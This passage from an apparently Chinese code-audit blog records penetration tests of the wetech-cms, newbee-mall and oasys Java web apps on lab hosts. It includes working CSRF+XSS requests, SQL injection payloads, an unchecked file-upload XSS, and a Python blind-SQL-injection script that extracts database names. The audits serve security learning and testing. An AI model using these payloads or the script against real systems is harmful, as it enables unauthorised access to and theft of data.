class="number">1</span></span></span><br></pre></td></tr></table></figure><p>​创建CSRFpoc，再以管理员身份访问，模拟管理员遭受攻击。</p><p><img src="/img/wetech-cms/image-20241128201304518.png" alt="image-20241128201304518"></p><p>​成功创建用户。</p><h3 id="CSRF-XSS"><a href="#CSRF-XSS" class="headerlink" title="CSRF+XSS"></a>CSRF+XSS</h3><p>​根据我们前面的测试我们可以知道，该项目存在大量的XSS攻击点，且在文章信息管理处，创建一个标题为XSSpayload的文章可实现对管理员的XSS攻击，但由于多数传参为POST型，所以难以利用，但是假设使用CSRF攻击一个能创建文章的低权限用户，则可能实现，通过XSS攻击直接攻击管理员，获取管理员身份。</p><p>​为进行实验，我们创建一个用户，能够编写文章。</p><p>​创建完成后，编写一个含有XSSpayload的数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/topic/add.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.55.165:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>299</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.21.55.165:8888</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.55.165:8888/admin/topic/add.do</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>collapase-nav=collapse-nav1; JSESSIONID=71F80098D094271EFCD339F4B489AAF6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">title</span>=%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(&#x27;CSRF%<span class="number">2</span>BXSS&#x27;)%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E&amp;cname=%E6%B1%BD%E8%BD%A6&amp;cid=<span class="number">5</span>&amp;status=<span class="number">1</span>&amp;recommend=<span class="number">0</span>&amp;publishDate=<span class="number">2024</span>-<span class="number">11</span>-<span class="number">28</span>&amp;content=%<span class="number">3</span>Cp%<span class="number">3</span>E%<span class="number">26</span>lt%<span class="number">3</span>Bscript%<span class="number">26</span>gt%<span class="number">3</span>Balert(&#x27;CSRF%<span class="number">2</span>BXSS&#x27;)%<span class="number">26</span>lt%<span class="number">3</span>B%<span class="number">2</span>Fscript%<span class="number">26</span>gt%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fp%<span class="number">3</span>E%<span class="number">3</span>Cp%<span class="number">3</span>E%<span class="number">3</span>Cbr%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fp%<span class="number">3</span>E&amp;summary=%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(&#x27;CSRF%<span class="number">2</span>BXSS&#x27;)%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E</span></span><br></pre></td></tr></table></figure><p><img src="/img/wetech-cms/image-20241128203107682.png" alt="image-20241128203107682"></p><p>​成功触发XSS攻击。<br>至此，wetech-cms审计结束</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code Audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>newbee-mall</title>
      <link href="/2024/11/25/newbee-mall/"/>
      <url>/2024/11/25/newbee-mall/</url>
      
        <content type="html"><![CDATA[<h2 id="项目技术栈-spring-boot-maven-mybatis"><a href="#项目技术栈-spring-boot-maven-mybatis" class="headerlink" title="项目技术栈:spring boot+maven+mybatis"></a>项目技术栈:spring boot+maven+mybatis</h2><h2 id="项目依赖审计"><a href="#项目依赖审计" class="headerlink" title="项目依赖审计"></a>项目依赖审计</h2><p>​依赖项中引入并不多，而已引入的依赖项也并没有可以进行利用的漏洞。</p><h2 id="单点漏洞审计"><a href="#单点漏洞审计" class="headerlink" title="单点漏洞审计"></a>单点漏洞审计</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>​在全局搜索中搜索${，搜到如下结果：</p><p><img src="/img/newbee-mall/1-1732536691802-2.png" alt="img"></p><p>​我们逐个追踪</p><h4 id="NewBeeMallGoodsMapper-xml"><a href="#NewBeeMallGoodsMapper-xml" class="headerlink" title="NewBeeMallGoodsMapper.xml"></a>NewBeeMallGoodsMapper.xml</h4><p>​该文件中有四个地方使用了$，先追溯第一个：</p><h5 id="goodsName"><a href="#goodsName" class="headerlink" title="goodsName"></a>goodsName</h5><p><img src="/img/newbee-mall/2-1732536691802-3.png" alt="img"></p><p>​向上追溯：</p><p><img src="/img/newbee-mall/3-1732536691802-4.png" alt="img"></p><p>​可以看到路由是&#x2F;goods&#x2F;list，定位到前端的商品管理模块，抓包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/goods/list?_search=false&amp;nd=1732506895164&amp;limit=20&amp;page=1&amp;sidx=&amp;order=asc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.83.43:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.83.43:8888/admin/goods</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=9A8E8D2487BFF9957C6725FB53EE6802</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>这里我们构造一个参数goodsName</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/goods/list?_search=false&amp;nd=1732506895164&amp;limit=20&amp;page=1&amp;sidx=&amp;order=asc&amp;goodsName=123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.83.43:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.83.43:8888/admin/goods</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=9A8E8D2487BFF9957C6725FB53EE6802</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​可以发现成功筛选了商品，尝试注入。输入单引号后发现出现错误，尝试闭合SQL语句。测试后发现该注入点可进行SQL盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">&#x27;)and+false%23。</span></span><br></pre></td></tr></table></figure><h5 id="keyword"><a href="#keyword" class="headerlink" title="keyword"></a>keyword</h5><h5 id=""><a href="#" class="headerlink" title=""></a><img src="/img/newbee-mall/4-1732536691802-5.png" alt="img"></h5><p>​向上追溯：</p><p><img src="/img/newbee-mall/5-1732536691802-6.png" alt="img"></p><p>​发现路由为&#x2F;search，猜测是前端的首页的搜索功能，进行搜索后抓包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/search?keyword=12312</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.80.85:8888</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.80.85:8888/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=CECCAACA0B3830B58F86BAF491DD38A5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​尝试输入单引号，发现报错，尝试闭合后拼接语句。payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload<span class="operator">=</span><span class="string">&#x27;)+or+false+and+concat(&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>​其余两个注入点与前两个注入点属于同一个功能的注入点，因此这里不再追溯审计</p><h3 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h3><p>​没有找到使用了命令执行函数的功能点</p><h3 id="任意文件操控（上传，读取，修改等）"><a href="#任意文件操控（上传，读取，修改等）" class="headerlink" title="任意文件操控（上传，读取，修改等）"></a>任意文件操控（上传，读取，修改等）</h3><p>​搜索upload，定位到控制器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/admin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/upload/file&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">upload</span><span class="params">(HttpServletRequest httpServletRequest, <span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> <span class="keyword">throws</span> URISyntaxException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">        <span class="type">String</span> <span class="variable">suffixName</span> <span class="operator">=</span> fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//生成文件名称通用方法</span></span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyyMMdd_HHmmss&quot;</span>);</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">tempName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        tempName.append(sdf.format(<span class="keyword">new</span> <span class="title class_">Date</span>())).append(r.nextInt(<span class="number">100</span>)).append(suffixName);</span><br><span class="line">        <span class="type">String</span> <span class="variable">newFileName</span> <span class="operator">=</span> tempName.toString();</span><br><span class="line">        <span class="type">File</span> <span class="variable">fileDirectory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(Constants.FILE_UPLOAD_DIC);</span><br><span class="line">        <span class="comment">//创建文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">destFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(Constants.FILE_UPLOAD_DIC + newFileName);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!fileDirectory.exists()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!fileDirectory.mkdir()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;文件夹创建失败,路径为：&quot;</span> + fileDirectory);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            file.transferTo(destFile);</span><br><span class="line">            <span class="type">Result</span> <span class="variable">resultSuccess</span> <span class="operator">=</span> ResultGenerator.genSuccessResult();</span><br><span class="line">            resultSuccess.setData(NewBeeMallUtils.getHost(<span class="keyword">new</span> <span class="title class_">URI</span>(httpServletRequest.getRequestURL() + <span class="string">&quot;&quot;</span>)) + <span class="string">&quot;/upload/&quot;</span> + newFileName);</span><br><span class="line">            <span class="keyword">return</span> resultSuccess;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> ResultGenerator.genFailResult(<span class="string">&quot;文件上传失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里的代码在文件上传后又修改了文件的名字，所以无法进行目录穿透。但是并没有对文件后缀进行校验，也就是说存在任意文件上传，但是由于该项目不解析JSP所以进行getshell，但是我们可以尝试传一个html进行XSS攻击。</p><p>​我们创建一个文本，内部嵌入XSSpayload，并修改为png进行上传，抓包后修改后缀提交，如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/upload/file</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.80.85:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>206</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.21.80.85:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryQaWx03yAmO19jNCn</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.80.85:8888/admin/carousels</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=CECCAACA0B3830B58F86BAF491DD38A5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-nix">------WebKitFormBoundaryQaWx03yAmO19jNCn</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Disposition:</span> form-data; <span class="attr">name</span><span class="operator">=</span><span class="string">&quot;file&quot;</span>; <span class="attr">filename</span><span class="operator">=</span><span class="string">&quot;XSS.html&quot;</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> image<span class="symbol">/png</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="symbol">&lt;script&gt;</span>alert(<span class="number">1</span>)<span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span></span><br><span class="line"><span class="language-nix"><span class="operator">-</span>-----WebKitFormBoundaryQaWx03yAmO19jNCn--</span></span><br><span class="line"><span class="language-nix"></span></span><br></pre></td></tr></table></figure><p>​得到返回包中的URL后访问：</p><p><img src="/img/newbee-mall/image-20241125201120054.png" alt="image-20241125201120054"></p><h2 id="前端渗透测试"><a href="#前端渗透测试" class="headerlink" title="前端渗透测试"></a>前端渗透测试</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>​经过测试发现该项目多处，如：轮播图，热销商品等多处均存在XSS漏洞。且多为存储型XSS，但是由于是POST传参，所以利用难度较大。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code Audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oasys-1</title>
      <link href="/2024/11/22/oasys-1/"/>
      <url>/2024/11/22/oasys-1/</url>
      
        <content type="html"><![CDATA[<h2 id="项目技术栈"><a href="#项目技术栈" class="headerlink" title="项目技术栈"></a>项目技术栈</h2><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><table><thead><tr><th>技术</th><th>名称</th><th>版本</th><th>官网</th></tr></thead><tbody><tr><td>freemarker</td><td>模板引擎</td><td>springboot1.5.6.RELEASE集成版本</td><td><a href="https://freemarker.apache.org/">https://freemarker.apache.org/</a></td></tr><tr><td>Bootstrap</td><td>前端UI框架</td><td>3.3.7</td><td><a href="http://www.bootcss.com/">http://www.bootcss.com/</a></td></tr><tr><td>Jquery</td><td>快速的JavaScript框架</td><td>1.11.3</td><td><a href="https://jquery.com/">https://jquery.com/</a></td></tr><tr><td>kindeditor</td><td>HTML可视化编辑器</td><td>4.1.10</td><td><a href="http://kindeditor.net/">http://kindeditor.net</a></td></tr><tr><td>My97 DatePicker</td><td>时间选择器</td><td>4.8 Beta4</td><td><a href="http://www.my97.net/">http://www.my97.net/</a></td></tr></tbody></table><h4 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h4><table><thead><tr><th>技术</th><th>名称</th><th>版本</th><th>官网</th></tr></thead><tbody><tr><td>SpringBoot</td><td>SpringBoot框架</td><td>1.5.6.RELEASE</td><td><a href="https://spring.io/projects/spring-boot">https://spring.io/projects/spring-boot</a></td></tr><tr><td>JPA</td><td>spring-data-jpa</td><td>1.5.6.RELEASE</td><td><a href="https://projects.spring.io/spring-data-jpa">https://projects.spring.io/spring-data-jpa</a></td></tr><tr><td>Mybatis</td><td>Mybatis框架</td><td>1.3.0</td><td><a href="http://www.mybatis.org/mybatis-3">http://www.mybatis.org/mybatis-3</a></td></tr><tr><td>fastjson</td><td>json解析包</td><td>1.2.36</td><td><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></td></tr><tr><td>pagehelper</td><td>Mybatis分页插件</td><td>1.0.0</td><td><a href="https://pagehelper.github.io/">https://pagehelper.github.io</a></td></tr></tbody></table><h2 id="一、项目依赖审计"><a href="#一、项目依赖审计" class="headerlink" title="一、项目依赖审计"></a>一、项目依赖审计</h2><p>​1、springframework命令执行漏洞（失败）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​该依赖存在命令执行漏洞，但是不具备利用条件</p><h2 id="二、单点漏洞审计"><a href="#二、单点漏洞审计" class="headerlink" title="二、单点漏洞审计"></a>二、单点漏洞审计</h2><h3 id="1、SQL注入"><a href="#1、SQL注入" class="headerlink" title="1、SQL注入"></a>1、SQL注入</h3><p>​在全局搜索中搜索${，发现有如下文件中的SQL语句使用$</p><p>​<img src="/img/oasys-1/1.png" alt="img"></p><h4 id="address-mapper-xml"><a href="#address-mapper-xml" class="headerlink" title="address-mapper.xml"></a>address-mapper.xml</h4><p>​语句如下：</p><p><img src="/img/oasys-1/2.png" alt="img"></p><p>​我们发现这里有多个参数都使用了$，向上追溯：</p><p><img src="/img/oasys-1/3.png" alt="img"></p><p>​发现在路由outaddresspaging调用了该方法</p><p>​根据功能点，定位到前端的外部通讯录。</p><h5 id="alph"><a href="#alph" class="headerlink" title="alph"></a>alph</h5><p>​通过审计我们可以发现，pinyin就是alph，经过测试我们可以确认alph参数存在SQL注入，具体流程如下：</p><p>​我们先创建一个名字为A的外部联系人</p><p>如下：</p><p><img src="/img/oasys-1/4.png" alt="img"></p><p>​这一步是为了让like有数据，这样我们才能执行后面的语句。根据测试我们发现可以进行SQL盲注，因此我们有如下的python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_post_request</span>(<span class="params">url, false_len, cookies=<span class="literal">None</span> </span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;alph&quot;</span>: <span class="string">f&quot;A\&#x27;and ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;k&#125;</span>--+qwe&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            response = requests.post(url, data=data, cookies=cookies)</span><br><span class="line">            <span class="comment">#print(len(response.text))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(response.text) != false_len:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">chr</span>(k)&#125;</span>&quot;</span> , end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 设置请求的URL</span></span><br><span class="line">    url = <span class="string">&quot;http://172.21.46.127:8888/outaddresspaging&quot;</span></span><br><span class="line">    <span class="comment"># 设置请求的Cookie</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;1E514058317178F919F2084D177556DE&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;alph&quot;</span>: <span class="string">&quot;A&#x27;and ascii(substr(database(),1,1))=1--+qwe&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#print(data)</span></span><br><span class="line">    respond=requests.post(url, data=data, cookies=cookies)</span><br><span class="line">    false_len=<span class="built_in">len</span>(respond.text)</span><br><span class="line">    <span class="comment">#print(false_len)</span></span><br><span class="line">    <span class="comment"># 发送POST请求</span></span><br><span class="line">    send_post_request(url , false_len, cookies)</span><br></pre></td></tr></table></figure><p>​我们可以成功的爆出库名</p><p><img src="/img/oasys-1/5.png" alt="img"></p><h5 id="outtype"><a href="#outtype" class="headerlink" title="outtype"></a>outtype</h5><p>​对于这个参数，注入方式与第一个参数相同，payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alph=A&amp;outtype=&#x27;and+sleep(5)--+qwe</span><br></pre></td></tr></table></figure><p>​alph等于是为了让前面的判断有数据，这样我们才能执行后面的sleep函数。</p><h5 id="baseKey"><a href="#baseKey" class="headerlink" title="baseKey"></a>baseKey</h5><p>​与前一个同理，payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alph=A&amp;outtype=&amp;baseKey=&#x27;and+sleep(4)--+qwe</span><br></pre></td></tr></table></figure><h4 id="notice-mapper-xml"><a href="#notice-mapper-xml" class="headerlink" title="notice-mapper.xml"></a>notice-mapper.xml</h4><p><img src="/img/oasys-1/6.png" alt="img"></p><p>​同样的，我们向上追溯：</p><p><img src="/img/oasys-1/7.png" 